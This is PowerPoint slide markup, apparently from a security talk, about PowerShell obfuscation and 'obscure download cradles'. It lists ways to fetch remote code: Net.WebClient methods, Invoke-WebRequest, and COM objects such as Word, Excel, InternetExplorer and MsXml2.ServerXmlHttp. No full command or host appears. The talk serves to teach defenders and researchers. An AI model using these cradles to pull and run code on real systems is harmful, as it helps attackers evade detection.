              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>VisualBasic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>JScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>)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200" dirty="0" smtClean="0"/>
              <a:t>Pre-Compiled Scripting</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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800" dirty="0" smtClean="0"/>
              <a:t>Obscure Download Cradles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="38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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Up Arrow 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16200000">
            <a:off x="5868797" y="3471371"/>
            <a:ext cx="248795" cy="2256087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6998152" y="4288526"/>
            <a:ext cx="2893994" cy="400110"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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000" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>SendKeys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> class + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>Notepad</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1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4928" y="1155401"/>
            <a:ext cx="4741960" cy="2777613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528887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800" dirty="0" smtClean="0"/>
              <a:t>Obscure Download Cradles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Memory-Based Cradles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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Method)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadData</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> Method)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>OpenRead</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Method)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>WebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(PS3.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>RestMethod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS3.0+)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.HttpWebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>.Net</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Class)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>SendKeys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Class + Notepad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200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>COM Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>+ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>WinWord/Excel/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>InternetExplorer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/MsXml2.ServerXmlHttp </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Inline Scripting (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>CSharp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>VisualBasic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>JScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>)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200" dirty="0" smtClean="0"/>
              <a:t>Pre-Compiled Scripting</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Up Arrow 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="8834729" y="3810000"/>
            <a:ext cx="272819" cy="1055378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6588478" y="2795664"/>
            <a:ext cx="4765322" cy="1323439"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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000" dirty="0"/>
              <a:t>New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>ComObject</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Word.Application</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>ComObje</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>     </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Excel.Application</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>C </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>InternetExplorer.Application</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>ComO</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MsXml2.ServerXmlHttp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="20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03232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800" dirty="0" smtClean="0"/>
              <a:t>Obscure Download Cradles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Memory-Based Cradles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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Method)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadData</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> Method)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>OpenRead</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Method)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>WebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(PS3.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>RestMethod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS3.0+)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.HttpWebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>.Net</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Class)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>SendKeys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Class + Notepad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200" b="1" dirty="0" smtClean="0"/>
              <a:t>COM Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>+ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>WinWord/Excel/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>InternetExplorer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>/MsXml2.ServerXmlHttp </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Inline Scripting (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CSharp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>VisualBasic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>JScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)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200" dirty="0" smtClean="0"/>
              <a:t>Pre-Compiled Scripting</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Bent Arrow 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="7038109" y="4357976"/>
            <a:ext cx="1136073" cy="1163782"/>
          </a:xfrm>
          <a:prstGeom prst="bentArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 11585"/>
              <a:gd name="adj2" fmla="val 18293"/>
              <a:gd name="adj3" fmla="val 16463"/>
              <a:gd name="adj4" fmla="val 4375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94218" y="1334314"/>
            <a:ext cx="5701812" cy="333542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1865155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800" dirty="0" smtClean="0"/>
              <a:t>Obscure Download Cradles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Memory-Based Cradles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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Method)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadData</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> Method)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>OpenRead</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Method)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>WebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(PS3.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>RestMethod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS3.0+)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.HttpWebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>.Net</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Class)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200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>SendKeys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> Class + Notepad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200" b="1" dirty="0" smtClean="0"/>
              <a:t>COM Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>+ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>WinWord/Excel/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>InternetExplorer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>/MsXml2.ServerXmlHttp </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Inline Scripting (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>CSharp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>VisualBasic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>JScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>)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200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Pre-Compiled Scripting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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770967"/>
            <a:ext cx="10058400" cy="2981915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7" name="Bent Arrow 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="4475018" y="4752882"/>
            <a:ext cx="1136073" cy="1163782"/>
          </a:xfrm>
          <a:prstGeom prst="bentArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 11585"/>
              <a:gd name="adj2" fmla="val 18293"/>
              <a:gd name="adj3" fmla="val 16463"/>
              <a:gd name="adj4" fmla="val 4375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312521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800" dirty="0"/>
              <a:t>MOAR! Crafting Cryptic </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>Cradles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>(In)security By Obscurity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Obscure Download Cradles</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Memory-based</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Disk-Based</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obscure Token Obfuscation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
